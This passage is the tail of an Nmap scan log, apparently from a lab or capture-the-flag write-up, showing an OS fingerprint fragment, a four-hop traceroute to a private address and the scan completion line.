OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 4 hops

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   59.18 ms  10.2.0.1
2   ... 3
4   198.85 ms 10.10.224.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 24 21:47:12 2020 -- 1 IP address (1 host up) scanned in 59.49 seconds
{% endhighlight %}
